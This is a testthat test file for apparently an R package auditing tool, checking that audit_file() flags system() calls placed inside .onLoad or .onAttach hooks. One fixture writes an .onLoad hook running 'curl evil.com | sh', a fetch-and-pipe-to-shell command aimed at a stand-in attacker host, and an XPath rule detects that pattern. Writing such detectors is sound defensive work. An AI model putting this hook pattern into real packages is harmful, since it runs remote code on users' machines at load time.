# Inline Rules for Testing -----------------------------------------------------
test_rules <- list(
  onload_calls_system_rule = list(
    xpath = '//expr[
      LEFT_ASSIGN
      and expr[1]/SYMBOL[text() = ".onLoad" or text() = ".onAttach"]
      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
        text() = "system" or text() = "system2"
      ]
    ]',
    message = "system() or system2() inside .onLoad or .onAttach.",
    type    = "warning",
    attck   = "T1059.004"
  )
)


# audit_file() ------------------------------------------------------------------
test_that("audit_file() returns NULL for a file with no findings", {
  tmp <- tempfile(fileext = ".R")
  on.exit(unlink(tmp), add = TRUE)
  writeLines(
    ".onLoad <- function(libname, pkgname) { packageStartupMessage() }",
    tmp
  )
  result <- audit_file(tmp, rules = test_rules)
  expect_null(result)
})


test_that("audit_file() returns a data frame for a file with findings", {
  tmp <- tempfile(fileext = ".R")
  on.exit(unlink(tmp), add = TRUE)
  writeLines(
    '.onLoad <- function(libname, pkgname) { system("curl evil.com | sh") }',
    tmp
  )
  result <- audit_file(tmp, rules = test_rules)
  expect_s3_class(result, "data.frame")
  expect_true(nrow(result) > 0L)
})


test_that("audit_file() returns expected columns", {
  tmp <- tempfile(fileext = ".R")
  on.exit(unlink(tmp), add = TRUE)
  writeLines(
    '.onLoad <- function(libname, pkgname) { system("id") }',
    tmp
  )
  result <- audit_file(tmp, rules = test_rules)
  expect_named(result, c("file", "line", "column", "rule", "message", "type",
                         "attck"))
})


test_that("audit_file() records the correct file path", {
  tmp <- tempfile(fileext = ".R")
  on.exit(unlink(tmp), add = TRUE)
  writeLines(
    '.onLoad <- function(libname, pkgname) { system("id") }',
    tmp
  )
  result <- audit_file(tmp, rules = test_rules)
  expect_equal(result$file[[1L]], tmp)
})


test_that("audit_file() returns NULL for a parse error", {
  tmp <- tempfile(fileext = ".R")
  on.exit(unlink(tmp), add = TRUE)
  writeLines("this is not { valid R code )(", tmp)
  expect_message(
    result <- audit_file(tmp, rules = test_rules),
    "Parse error"
  )
  expect_null(result)
})
